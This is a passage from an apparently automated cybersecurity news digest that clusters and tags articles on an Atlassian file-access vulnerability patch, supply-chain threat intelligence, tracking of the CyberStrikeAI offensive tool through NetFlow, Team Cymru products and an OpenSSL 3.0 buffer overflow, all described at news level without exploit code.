loud attacks now, the noise will start going down over time. How to build resilience Have an incident response plan (IRP) and rehearse it. A plan that lives in a drawer that hasn’t been opened for few years will probably not work when it’s needed. You’ll need named owners and decision authorities, specified out-of-band communications for when your primary channels are under attack, and a clear line to legal and to law enforcement. Map the IRP to a recognized incident lifecycle so nothing gets improvised under pressure. Preparation, detection and analysis, containment, eradication, recovery, and a post-
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: One breach, please, and make no mistakes
  - Published: 2026-10-07T10:00:25+00:00
  - Link: https://blog.talosintelligence.com/one-breach-please-and-make-no-mistakes/
  - Summary: The cybersecurity community has seen examples of autonomous agents, built inside AI labs, attacking public infrastructure. How you prepare for agentic threats is what makes the difference during real incidents.

### Cluster f8ded28673 — score 12

- Title: Atlassian Patches Critical Vulnerability Affecting 8 Products
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-07T06:37:16+00:00
- Link: https://www.securityweek.com/atlassian-patches-critical-vulnerability-affecting-8-products/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ransomware_extortion, web_shell_backdoor, zero_day
- affected_industries: healthcare
- affected_products: Citrix, Fortinet, npm
- cve_ids: CVE-2026-21589
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach, web_shell_backdoor, active_exploitation
- affected_industries: healthcare
- affected_products: npm, Fortinet, Citrix
- cve_ids: CVE-2026-21589
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Unauthenticated attackers could exploit the flaw to access specific files in the web application root directory. The post Atlassian Patches Critical Vulnerability Affecting 8 Products appeared first on SecurityWeek .
```

#### Full body

```
Atlassian has rolled out patches for a critical-severity vulnerability that impacts all versions of eight of its products. The security defect, tracked as CVE-2026-21589 (CVSS score of 9.3), is described as an arbitrary file access issue. It can be exploited without authentication to access specific files in the web application root directory. “Exploitation requires prior knowledge of the target file’s exact name and path; this vulnerability does not allow attackers to enumerate or list directory contents. In some configurations, there may be sensitive files present that increase your risk,” Atlassian notes in its advisory . All versions of Bitbucket Data Center, Bamboo Data Center, Crowd Data Center, Crucible, Confluence Data Center, Fisheye, Jira Service Management Data Center, and Jira Software Data Center are impacted, the company says. Fixes were included in Bitbucket versions 9.4.26, 10.2.8, and 10.5.1; Bamboo versions 10.2.24 and 12.1.12; Confluence versions 9.2.26 and 10.2.19; Crowd versions 6.3.7, 7.0.3, 7.1.7, and 7.2.4; Crucible version 4.9.15; Fisheye version 4.9.15; Jira Service Management versions 5.12.40, 10.3.26, and 11.3.12; and Jira versions 9.12.40, 10.3.26, and 11.3.12. Advertisement. Scroll to continue reading. Organizations are advised to patch their self-hosted deployments as soon as possible or disconnect their instances from the internet until the fixes can be installed. Atlassian’s advisory also details temporary mitigations. “Instances accessible to the public internet, including those with user authentication, should be restricted from external network access until you can take action,” the company notes. Both Atlassian and preemptive exposure management firm WatchTowr note that there is no evidence of CVE-2026-21589 being exploited in the wild. According to WatchTowr, however, ransomware groups and APTs have exploited this type of vulnerability in the past, and eight Atlassian security flaws are currently on CISA’s KEV list . “Organizations that have SSO enabled through Crowd, which is the recommended approach, should be extra cautious. The authentication details are stored in plaintext in a predictable, known path and can be trivially extracted. With these, attackers can mint their own admin users and gain access should Crowd endpoints be remotely accessible,” WatchTowr principal threat intelligence specialist Yordan Ganchev said. “Organizations running any of the eight affected Atlassian products on-site should patch immediately. Where patching is not immediately possible, users should follow vendor guidance on deploying WAF rules to block exploitation attempts,” Ganchev added. Related: Exploitation Hits Rejetto HFS Vulnerability Discovered by AI Related: Exploitation of Citrix NetScaler Zero-Day Hits Appliances Patched Days Earlier Related: Fortra Patches Critical Vulnerabilities in BoKS Related: Exploited Fortinet FortiMail Zero-Day Calls for Urgent Action Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Android’s October 2026 Updates Patch 25 Vulnerabilities FBI Arrests ‘Most Wanted’ Developer of Ploutus ATM Malware Apple to Tighten Full Disk Access Controls in macOS Amid AI Risks Long-Running NPM Malware Campaign Accumulates 40,000 Downloads 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register Linux Backdoor Abuses STUN Protocol, Exploits Dozens of Flaws 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Exploitation Hits Rejetto HFS Vulnerability Discovered by AI Latest News Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts Qilin Ransomware Suspect Arrested in Japan, Extradited to Germany Hadrian Raises $40 Million to Expand Autonomous Offensive Security Platform Advantest Discloses Data Breach Months After Ransomware Attack Chrome 155 Up
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Atlassian Patches Critical Vulnerability Affecting 8 Products
  - Published: 2026-10-07T06:37:16+00:00
  - Link: https://www.securityweek.com/atlassian-patches-critical-vulnerability-affecting-8-products/
  - Summary: Unauthenticated attackers could exploit the flaw to access specific files in the web application root directory. The post Atlassian Patches Critical Vulnerability Affecting 8 Products appeared first on SecurityWeek .

### Cluster 4ff2661d4c — score 12

- Title: Supply Chain & CTI
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/supply-chain-cti
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: government
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: government
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This blog explores how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk.
```

#### Full body

```
Will Thomas 5 min read July 8, 2025 Supply Chain & CTI Why expanding third party risks is no longer a luxury In this blog, we‚Äôll explore how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk. Across the globe, many new laws like DORA in the EU and CMMC in the US have been implemented, driving the need to not just reactively engage with your supply chain, but proactively collaborate and monitor third-party infrastructure for signals of compromise. The underlying intention is that the ecosystem you are part of is more robust when working together. These regulations are likely to be adopted by many other industries, making this blog worthwhile reading for security teams of all sizes and sectors. Reactive supply chain management typically involves sending Supplier Assurance Questionnaires (SAQs) to suppliers after a confirmed breach has occurred, often by the time it makes the news. Many large organizations have taken the initiative to leverage threat intelligence services that support checking for brand name keywords or domains appearing on ransomware data leak sites, cybercrime forum posts, or darkweb credential markets. An even more proactive measure that could be taken to manage supply chain risks involves using passive scanning services to check for unpatched vulnerabilities in supply chain networks, as well as using NetFlow data to detect malicious command-and-control (C2) communications originating from supplier environments. Key Findings Technology leaders are issuing warnings to their supply chain to modernise their cybersecurity practices Governments are introducing more legislation to protect digital services and critical sectors from supply chain risks More organizations need to incorporate proactive threat intelligence to evaluate supply chain vendors Netflow data presents itself as a useful alternative method for organizations to validate supply chain ecosystems. Supply Chain Management Many organizations start by prioritising who their supply chain vendors are and create a criteria based on several factors, such as the impact to business operations if they were attacked, or the sensitivity of the data they process or store for them. Other factors that come into play are whether the supply chain vendors have direct network access into the organization‚Äôs environment, and which environments those are as well. One of the challenging aspects for CTI teams doing this type of work is figuring all these things out for a large number of suppliers. Fortune 500 organizations will often have upwards of 5,000 suppliers, in many cases from around the world. Working out these factors for every supplier to rank and prioritise them is difficult on its own. This type of information is often only available in contracts possessed by the procurement or law departments and may be vague and obscure. Getting a handle on which suppliers have direct network access to your organization‚Äôs environment is often made a priority due to the implications of a software supply chain attack or identity-based network intrusion. Without network-level visibility to know where cyber threats can arrive from, the chances of detecting an intrusion are severely diminished. In other cases, knowing which suppliers handle the most sensitive information about your organization is also crucial to understanding your expanded attack surface that extends to third parties. Supply chain partners such as law firms will often hold highly sensitive information for their clients, making them ideal targets for persistent adversaries willing to put in the work to get in. Defining Cyber Threat Intelligence Team Capabilities Before we detail the sources of CTI, let‚Äôs explore the nuances that will enable you to align with your existing teams and capabilities. First on the maturity ladder from a CTI perspective is supporting Incident Response operations, which can include Reactive Threat Hunting operations. At this stage, many CTI
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Supply Chain & CTI
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/supply-chain-cti
  - Summary: This blog explores how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk.

### Cluster bd4fb91f5d — score 12

- Title: Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-elite-threat-hunters-prevent-supply-chain-breaches
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: financial_services, legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: financial_services, legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how elite threat hunters and Pure Signal Recon help CISOs prevent supply chain breaches, save millions, and boost security ROI. Learn more.
```

#### Full body

```
tcblogposts min read March 13, 2024 Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches Up the Ante Against Supply Chain Attacks and Still Have Time to Save the World Introduction In our first post we talked about how external threat hunting with Pure Signal Recon can have a direct financial savings in terms of reducing the cost of a data breach and minimizing risk. In our second blog post we talked about how most organizations need fewer cyber threat intelligence sources than they subscribe to, it‚Äôs a good place to realize some tactical yet meaningful budget savings. Based on feedback from our Fortune 10 client, we also explored how too many CTI sources can detract from your external threat hunting program if the curated data isn‚Äôt relevant or timely. Let‚Äôs discuss the impact Pure Signal Recon had on this Fortune 10 security organization to help them better identify security gaps and confirmed threats originating from their supply chain. Additional visibility and leveraging the right CTI data reduced the cost of compromise, with use cases such as: Early identification of compromised third parties Shut down of threat actor Command & Control (C2) communications in real-time Blocking 24 of 30 significant events with third parties.* Notifying an additional 300 compromised organizations and provided enough information to prevent or minimize damage Raising the cost to attack - Continually forced bad actors to retool their infrastructure ‚ÄúIn the beginning of 2020, we saw a major increase in ransomware hitting our third parties. If they are compromised in any way, shape, or form, then our IR and legal teams become actively involved. They make sure that no data related to us is leaked, that [the third party‚Äôs] network is secure, and that [the third party] won‚Äôt be used as a pivot to get into our networks. There‚Äôs a time-consuming process that comes with a compromise of our third parties.‚Äù Lead security analyst In addition, their supply chain threat hunting and monitoring efforts earned a projected cost reduction of $1,3M of net present value savings over three years. A Mile Long Supply Chain Requires Significant Expertise to Secure This Fortune 10 multinational national retailer has a supply chain that is expansive as it varied. While there is no doubt their supply chain serves as a strategic advantage; it can also be used as another attack vector to compromise vulnerable core applications and security gaps in infrastructure. This is no surprise considering 98% of organizations have a relationship with at least one third party that has experienced a breach in the last two years.1 Every compromised supply chain partner incident has a significant cost in terms of cybersecurity, legal and potentially PR expertise to respond to an event, depending how far reaching the breach, and how well recognized your brand. Time is crucial to ensuring a third-party breach can‚Äôt be used to pivot into core systems. The legal & PR teams get involved to minimize the possibility of negative press and customer notification mandates. ‚ÄúWith Recon, we map the infrastructure being used by some ransomware groups. We block them from entering our network, monitor their infrastructures as they evolve, and monitor potential victims such as third-party entities. When [a third party is] compromised, we identify it with Recon, then tell [the third party] how [the threat actor] got in ... and what they need to do to stop them immediately.‚Äù Lead security analyst The case study organization typically requires at least 15 FTE security analysts or legal professionals working three days each when a partner is compromised. Using Pure Signal Recon , they were able to block 24 of 30 significant events with a third party. Using a simple formula of $75 per hour for each FTE multiplied by 3 days each, it is easy to see how the cost of responding to supply chain compromises adds up. High-risk third-party threat events whe
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-elite-threat-hunters-prevent-supply-chain-breaches
  - Summary: Discover how elite threat hunters and Pure Signal Recon help CISOs prevent supply chain breaches, save millions, and boost security ROI. Learn more.

### Cluster 7bab174bc9 — score 11

- Title: Tracking CyberStrikeAI Usage
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.
```

#### Full body

```
Will Thomas 5 min read March 2, 2026 Tracking CyberStrikeAI Usage Team Cymru is continuously monitoring our global netflow visibility to uncover patterns of adversary activity, identify malicious operations, and gain actionable intelligence. In this post, we are diving into CyberStrikeAI, an open-source artificial intelligence (AI) offensive security tool (OST) developed by a China-based developer who we assess has some ties to the Chinese government. What is CyberStrikeAI? In its own words from the GitHub repository (see here ), ‚ÄúCyberStrikeAI is an AI-native security testing platform built in Go. It integrates 100+ security tools, an intelligent orchestration engine, role-based testing with predefined security roles, a skills system with specialized testing skills, and comprehensive lifecycle management capabilities.‚Äù CyberStrikeAI comes with its own dashboard that helps users quickly understand the platform's core features and current state, as shown in Figure 1 below. Figure 1: CyberStrikeAI Dashboard from GitHub CyberStrikeAI was first brought to our attention following the Amazon CTI team‚Äôs blog about AI-augmented threat actor infrastructure they had discovered. Amazon shared this related IP 212.11.64[.]250. Analysis of that IP address in Team Cymru Scout‚Äôs open port scan data revealed that it had this ‚ÄúCyberStrikeAI‚Äù banner running on this service, as shown in Figure 2 below. Figure 2: The CyberStrikeAI port banner in Team Cymru Scout. Identifying Targeting with NetFlow Using Team Cymru Scout, we can find NetFlow communications between the IP shared by Amazon and its targets, such as the Fortinet FortiGate devices it was observed targeting, as shown in Figure 3 below. Figure 3. IP address running CyberStrikeAI targeting a Fortinet FortiGate device. Researching Ed1s0nZ While researching the GitHub profile (see here ) of CyberStrikeAI‚Äôs developer, ‚ÄúEd1s0nZ‚Äù, several attributes about the individual caught our attention. Firstly, Ed1s0nZ‚Äôs other GitHub repositories suggest interest in exploitation activity: watermark-tool: A secure and efficient invisible document watermarking solution that can add completely invisible digital watermarks to various documents, while supporting watermark extraction and verification. Developed in Go, it supports both web and CLI usage. The watermark uses steganography technology to ensure that the watermark is completely invisible and does not affect the reading experience and visual effects of the original document. PrivHunterAI: This tool uses a passive proxy approach and mainstream AI (such as Kimi, DeepSeek, GPT, etc.) to detect privilege escalation vulnerabilities. Its core detection function is built on the open APIs of the relevant AI engines and supports data transmission and interaction via HTTPS protocol. InfiltrateX: A useful privilege escalation scanning tool. While automated detection of privilege escalation vulnerabilities is difficult, prone to occur, and poses serious risks, it can still strive to automate the detection of some such vulnerabilities. Further, Ed1s0nZ‚Äôs GitHub activities indicate they interact with organisations that support potentially Chinese government state-sponsored cyber operations. This includes Chinese private sector firms that have known ties to the Chinese Ministry of State Security (MSS). A number of GitHub activities potentially link Ed1s0nZ to the Chinese state-sponsored cyber operations. On 19 December 2025, Ed1s0nZ posted CyberStrikeAI to Knownsec 404‚Äôs Starlink Project, as shown in Figure 4 below. Based on published reporting by DomainTools and others, Knownsec does work for the MSS and the Chinese People‚Äôs Liberation Army (PLA). Figure 4. Ed1s0nZ‚Äôs post sharing CyberStrikeAI to Knownsec 404‚Äôs Starlink Project. Further, on 5 January 2026, Ed1s0nZ added to their GitHub profile ‚ÄúCNNVDÔºàÂõΩÂÆ∂‰ø°ÊÅØÂÆâÂÖ®ÊºèÊ¥ûÔºâ 2024 Âπ¥Â∫¶ÊºèÊ¥ûÂ•ñÂä±ËÆ°Âàí ¬∑ ‰∫åÁ∫ßË¥°ÁåÆÂ•ñÔºà‰∏™‰∫∫). Translation: CNNVD (Chinese National Vulnerab
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Tracking CyberStrikeAI Usage
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
  - Summary: Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.

### Cluster 498d32f5a8 — score 11

- Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion
- actor_attribution: Cl0p
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, active_exploitation
- actor_attribution: Cl0p
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.
```

#### Full body

```
Jeremy Bender 1 min read December 4, 2025 RADAR Takes the Guess Work Out of Vulnerability Exposure Management Identifying critical vulnerabilities in exposed, internet-facing systems is essential for security—it can also be extremely time intensive. Maintaining an accurate list of organization-wide assets can be difficult enough as is, without even getting into the challenge of shadow IT, cloud sprawl, or third-party assets you may not even know exist. Even once assets are fully inventoried, you still need to identify running processes and potential vulnerabilities for remediation. Is it really any wonder, with all the steps involved, that mistakes happen and vulnerabilities can remain unpatched? RADAR takes all the guesswork out of vulnerability exposure assessments. With a simple search, RADAR discovers all internet-facing infrastructure linked to the provided domains. Within seconds, you can use this to deliver a list of domain-linked IPs containing known exploited vulnerabilities (KEVs). How RADAR Exposes Vulnerabilities In RADAR, enter a top-level domain, or series of linked domains. RADAR will automatically pull in all associated internet-facing IPs, domains, and CIDR ranges. Within RADAR, you can then specifically view associated IPs discovered through the search. RADAR will automatically enrich each listed IP with any CVEs using CISA’s live database. The enriched CVE information will contain the CVE number, description, and when the CVE was first and last seen. For more granular information, you can also apply filters, including filtering KEVs. This automatically reduces the asset list to just those containing verified risks currently being exploited in the wild. You can then further filter out CDNs or shared hosts, leading to a clear prioritized list of assets you directly manage. Within seconds, RADAR can make a clear, actionable list of assets for vulnerability teams to focus on for remediation. How to Access RADAR Through January 31, 2026, all existing Team Cymru Recon or Scout customers have complimentary RADAR access. For those interested in testing RADAR without current access, visit go.team-cymru.com/puresignal-radar to see what makes RADAR and Team Cymru’s PureSignal™ data so unique. ‍ Copy Link The latest articles straight to your inbox Related Posts Scott Fisher 5 min read Relaying to the Frontier Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis 3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - Summary: Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.

### Cluster 0be1df44fd — score 11

- Title: Webmin Vulnerability and Port Scanning Activity
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stay ahead of cyber threats with our in-depth analysis of the Webmin vulnerability and port scanning activity. Protect your technology company now!
```

#### Full body

```
Cybersecurity Blog: Threats, Trends, and Real-World Intelligence Scott Fisher 5 min read Relaying to the Frontier Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis 3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Josh Picolet 3 min read From C2 Detection to Possible Victim Identification Abigail Lorion 2 min read Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging Abigail Lorion 4 min read min read Cybercrime Doesn't Reinvent Itself. It Optimizes. Abigail Lorion 3 min read min read The Unclosed Gap: Why the 2026 DBIR Proves the Decisive Battle Happens Before the First Internal Alert Stephen Campbell 5 min read min read Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Eli Woodward 3 min read Unmasking DPRK Cyber Threat Actors: Fake IT Worker Infrastructure & Post-Exposure Analysis Eli Woodward 3 min read Cyber Security Intelligence: Analysis of Edge Devices Amid Growing Vulnerabilities Next The latest articles straight to your inbox
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Webmin Vulnerability and Port Scanning Activity
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - Summary: Stay ahead of cyber threats with our in-depth analysis of the Webmin vulnerability and port scanning activity. Protect your technology company now!

### Cluster 88364fe6d8 — score 11

- Title: Research Shows Number of Potentially Compromised Organizations More than Doubles Since January
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.
```

#### Full body

```
Cybersecurity Blog: Threats, Trends, and Real-World Intelligence Scott Fisher 5 min read Relaying to the Frontier Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis 3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Josh Picolet 3 min read From C2 Detection to Possible Victim Identification Abigail Lorion 2 min read Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging Abigail Lorion 4 min read min read Cybercrime Doesn't Reinvent Itself. It Optimizes. Abigail Lorion 3 min read min read The Unclosed Gap: Why the 2026 DBIR Proves the Decisive Battle Happens Before the First Internal Alert Stephen Campbell 5 min read min read Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Eli Woodward 3 min read Unmasking DPRK Cyber Threat Actors: Fake IT Worker Infrastructure & Post-Exposure Analysis Eli Woodward 3 min read Cyber Security Intelligence: Analysis of Edge Devices Amid Growing Vulnerabilities Next The latest articles straight to your inbox
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Research Shows Number of Potentially Compromised Organizations More than Doubles Since January
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
  - Summary: Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.

### Cluster 38ff3233e6 — score 11

- Title: High Vulnerability in OpenSSL 3.0
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/high-vulnerability-in-openssl-3-0
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- cve_ids: CVE-2022-3602, CVE-2022-3786
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ddos
- cve_ids: CVE-2022-3602, CVE-2022-3786
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stay informed about the high vulnerability in OpenSSL 3.0 with our latest blog post. Understand the impact on security and protect your technology company.
```

#### Full body

```
tcblogposts 3 min read November 2, 2022 High Vulnerability in OpenSSL 3.0 How Team Cymru products help you discover and manage the impact and risk On November 1st, 2022, version 3.0.7 of OpenSSL was released to patch a high vulnerability, at the time of writing it was as yet undisclosed . Vulnerability Description Published as X.509 Email Address 4-byte Buffer Overflow with accompanying CVE-2022-3602 and CVE-2022-3786, this vulnerability allows an attacker to craft a malicious email address in a certificate to overflow an arbitrary number of bytes containing the `.' character (decimal 46) on the stack. Vulnerability Impact The specific CVE-2022-3602 vulnerability, if exploited, could result in a crash (causing a denial of service) and/or remote code execution. What is being advised? Upgrading to OpenSSL 3.0.7 as soon as possible is being advised for users of OpenSSL 3.0.0 - 3.0.6. How to assess risk using Team Cymru products Team Cymru has two products that enable organisations to assess and quantify this vulnerability, and measure risk to both their own, and third parties. Starting with Pure Signal Orbit, our Attack Surface Management platform. With a combination of Asset Management, Vulnerability Management, Business Risks and Threat Intelligence , it is the most fully featured product on the market that finds assets, reveals vulnerabilities and alerts to threats at unmatched speed and scale. This puts you at a distinct advantage when facing celebrity vulnerabilities and reacting to alerts of high or critical patches. Assessing the Attack Surface & External Digital Assets for OpenSSL 3.x Vulnerabilities How to use Pure Signal Orbit to find impact assets and quantify impact of the Open SSL 3.0.7. After logging in, go to Vulnerability Management, then follow these two alternative steps: From the Pure Signal Orbit Dashboard Move your cursor to the bottom right of the dashboard as shown below, and click on the box that highlights OpenSSL Less Than 3.0.7 Critical Vulnerability. Figure 1 - where to find the Vulnerability alerts in the Orbit dashboard ‚Äç You will see this box in the lower right corner of the Pure Signal Orbit Dashboard. Figure 2 - the OpenSSL v3.0 Vulnerability alert in the Orbit dashboard ‚Äç You will then see a list of impacted assets, where you can click through as see specifics such as Environment, Business Risk score, any other Vulnerabilities that may be present, in addition to our helpful response guides. From the Vulnerability Management view Log in to your Pure Signal Orbit dashboard and select ‚ÄòVulnerabilities‚Äô, and then select ‚ÄòVulnerability Types‚Äô shown below. In the search box shown below, type the following: ‚ÄúOpenSSL‚Äù or ‚ÄúCVE-2022-3786‚Äù or ‚ÄúCVE-2022-3602‚Äù (not currently live in this view yet) Figure 3 - where to find the the search tool within the Orbit dashboard You will now be presented with the list of assets impacted by Open SSL Critical Vulnerability, and can take action in order of priority using our integrated Total Asset Risk score that combines CVE weightings in addition to Business Risk scores. Threat Reconnaissance technique for assessing potential OpenSSL risk from vulnerable third parties Pure Signal Recon is our analysts portal into the world‚Äôs largest data ocean designed specifically for Threat Intelligence. By ingesting over 200bn daily internet connections, Pure Signal data is unmatched in size and scale to gain visibility into third party risks, and very effective at making discoveries when vulnerabilities are announced.. How to use Pure Signal Recon to find impact assets and quantify impact of the Open SSL 3.0.7. After logging in, run a Query, include the following: Specify your timeframe - i.e. previous 7 days Specify the IP addresses or ranges of IP‚Äôs of interest There are 2 primary data sets that will contain this information - ‚ÄúOpen Ports‚Äù and ‚ÄúNMAP Open Ports‚Äù Use the post query filters and search for ‚ÄúOpenSSL/3‚Äù to identify any vulnerable v
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: High Vulnerability in OpenSSL 3.0
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/high-vulnerability-in-openssl-3-0
  - Summary: Stay informed about the high vulnerability in OpenSSL 3.0 with our latest blog post. Understand the impact on security and protect your technology company.

### Cluster 24d5e7827d — score 11

- Title: ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T16:45:38+00:00
- Link: https://thehackernews.com/2026/10/threatsday-ai-powered-zero-day-chain.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
